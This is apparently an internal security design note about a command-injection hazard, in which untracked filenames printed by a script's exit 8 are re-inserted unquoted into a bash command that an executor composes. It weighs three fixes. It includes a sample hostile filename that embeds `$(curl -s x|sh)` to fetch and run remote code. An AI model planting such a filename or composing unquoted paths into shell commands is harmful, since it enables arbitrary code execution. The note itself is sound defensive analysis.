# Exit 8's path list is untrusted input entering a composed command

From ticket 001's refactor pass (security-engineer, verified by firing). `git ls-files --others --exclude-standard` reports filenames verbatim — a scratch repo confirmed that `a;b.md`, `docs $(id).md`, and `star*.md` all reach stdout unquoted. Exit 8 prints that list to stderr, and all three consuming skills then instruct the executor to *re-invoke the script naming every reported path*, with `DIFF-MATERIALIZATION.md` insisting the paths match "verbatim". So an untracked file named `docs/specs/ideas/$(curl -s x|sh).md` — dropped by build output, an extracted archive, or a dependency postinstall, none of which require git write access — round-trips from the tree into a `bash …` command line the executor composes, on an invocation that looks exactly like every prior close-out's. The refactor pass that found this had itself composed exactly such a command with six unquoted paths minutes earlier.

The prose half is fixed: `DIFF-MATERIALIZATION.md` now carries a single-quote-every-path clause modeled on `STORE.md`'s shape gate for branch links, which is the same hazard through a different channel. What is banked is the **mechanism** half, because it is a published-contract change rather than a cleanup. Two directions, and they conflict: emitting shell-safe (single-quoted or `printf %q`) paths on stderr breaks the "must match exit 8's own output verbatim" rule that makes `--allow-untracked`'s string equality work, since the caller would then be passing a quoted string the comparison never matches; alternatively the acknowledgment set moves off `argv` entirely — stdin, or `--allow-untracked-from <file>` — which removes the composition step rather than trying to make it safe, at the cost of a second invocation shape for every consumer to learn. A third, cheapest option is a shape gate in the script: refuse any reported path containing a shell metacharacter, naming it, so the dangerous case never reaches a caller at all.

Open questions at promotion: whether the round trip's string-equality design survives any of the three (the `--allow-untracked-from` route is the only one that leaves it untouched); whether a shape-gate refusal needs its own exit code or rides exit 8 with different stderr; and whether the same never-interpolate discipline needs stating once in a `_shared` home rather than a third time in prose, given `STORE.md` already states it for branch links and `DIFF-MATERIALIZATION.md` now states it for untracked paths — two instances is the corpus's usual threshold for a shared home.
